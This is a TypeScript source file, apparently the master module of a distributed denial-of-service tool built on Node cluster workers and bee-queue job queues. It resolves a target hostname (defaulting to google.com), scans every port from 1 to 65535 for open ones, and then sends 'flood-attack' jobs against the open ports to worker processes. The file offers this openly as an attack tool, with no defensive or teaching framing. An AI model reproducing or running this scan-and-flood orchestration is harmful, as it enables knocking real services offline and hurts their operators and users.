import os = require('os');
import cluster = require('cluster');

// @ts-ignore
import BeeQueue = require('bee-queue');

import { getIpAddressesForHostName } from './dns';
import { IPScanResult } from './worker';

const workers: cluster.Worker[] = [];
let portScanQueue: BeeQueue;
let floodAttackQueue: BeeQueue;

const maxPort = 65535;

export interface IPScanTask {
  ip: string;
  portRange: [number, number];
}

export interface FloodTask {
  targets: FloodTarget[];
  localPorts: [number, number];
}

export interface FloodTarget {
  ip: string;
  port: number;
}

export async function startMaster () {
  addSIGINTListener();
  // start timer for complete program runtime
  console.time('complete');

  let hostname = getHostName();

  // Resolve hostname to IP addresses
  console.time('ip-resolve');
  let ipAddresses = await getIpAddressesForHostName(hostname);
  console.timeEnd('ip-resolve');

  // creat the portScanQueue and populate it with tasks for child processes
  // master only creates the tasks and handles the responses
  portScanQueue = new BeeQueue('port-scan', { isWorker: false });
  floodAttackQueue = new BeeQueue('flood-attack', { isWorker: false });
  // make sure they are empty before spawning workers
  await portScanQueue.destroy();
  await floodAttackQueue.destroy();

  spawnWorkers();

  const floodTargets: FloodTarget[] = [];
  portScanQueue.on('job succeeded', (jobId: string, result: IPScanResult) => {
    if (result.openPorts.length > 0) {
      for (let i = 0; i < result.openPorts.length; i++) {
        let openPort = result.openPorts[i];
        floodTargets.push({ip: result.ip, port: openPort});
        console.log(`Job ${jobId} found target: ${result.ip}:${result.openPorts[i]}`);
      }
    }
  });

  console.time('scan-task-creation');
  await createIpScanTasks(portScanQueue, ipAddresses);
  console.timeEnd('scan-task-creation');

  await awaitQueueEmpty(portScanQueue);
  console.log('all ports have been scanned');
  console.log('flood targets:', floodTargets);

  console.time('attack-task-creation');
  await createFloodTasks(floodAttackQueue, floodTargets);
  console.timeEnd('attack-task-creation');
}

// get the hostname from command line argument or default to google.com
function getHostName (): string {
  let hostname;
  // it should be the parameter directly after this filename
  let processArguments = process.argv;

  for (let i = 0; i < processArguments.length; i++) {
    let arg = processArguments[i];
    if (arg.indexOf('ddos.ts') !== -1) {
      hostname = processArguments[i + 1];
      break;
    }
  }

  if (!hostname) {
    return 'google.com';
  }

  if (hostname.indexOf('//') > -1) {
    hostname = hostname.split('/')[2];
  }

  return hostname;
}

function spawnWorkers (): cluster.Worker[] {
  const numCPUs = os.cpus().length;

  // fork workers.
  // consider spawning 1 less to leave a CPU for master
  for (let i = 0; i < numCPUs; i++) {
    workers.push(cluster.fork());
  }

  console.log(`spawned ${workers.length} workers`);
  return workers;
}

async function createIpScanTasks (queue: BeeQueue, ipAddresses: string[]) {
  for (let i = 0; i < ipAddresses.length; i++) {
    // create 65535 tasks in parallel
    let promises = [];
    let ip = ipAddresses[i];

    for (let x = 1; x <= maxPort; x += 100) {
      // considerable performance gain by switching from 1 ip/port combo per task to instead having ip ranges.
      let task: IPScanTask = { ip: ip, portRange: [x, x + 99] };

      if (task.portRange[1] > maxPort) {
        task.portRange[1] = maxPort;
      }

      promises.push(queue.createJob(task).save());
    }

    await Promise.all(promises);
    console.log(`created ${promises.length} tasks for ip address ${ip}`);
  }
}

async function createFloodTasks (queue: BeeQueue, floodTargets: FloodTarget[]) {
  let promises = [];
  // for this part we create a number of tasks equal to the number of worker processes to make sure work is spread evenly.
  for (let i = 0; i < workers.length; i++) {
    // localPorts assigned to this process
    let startPort = Math.ceil(1 + (maxPort / workers.length) * i);
    let endPort = Math.floor(startPort + maxPort / workers.length);

    if (endPort > maxPort) {
      endPort = maxPort;
    }

    let localPorts: [number, number] = [startPort, endPort];
    let task: FloodTask = {
      targets: floodTargets,
      localPorts: localPorts
    };

    promises.push(queue.createJob(task).save());
  }

  await Promise.all(promises);
}

async function awaitQueueEmpty (queue: BeeQueue) {
  return new Promise((resolve) => {
    const resolveIfQueueEmpty = async () => {
      let health = await queue.checkHealth();

      if (health.waiting === 0 && health.active === 0) {
        return resolve();
      }

      console.log(`${health.active} tasks being processes ${health.waiting} tasks waiting`);
      setTimeout(resolveIfQueueEmpty, 100);
    };

    resolveIfQueueEmpty();
  });
}

function addSIGINTListener () {
  process.on('SIGINT', async () => {
    if (floodAttackQueue !== undefined && floodAttackQueue !== null) {
      await floodAttackQueue.close();
    }

    console.log(`SIGINT received on master`);
    if (portScanQueue !== undefined && portScanQueue !== null) {
      await portScanQueue.close();
    }

    process.exit();
  });
}
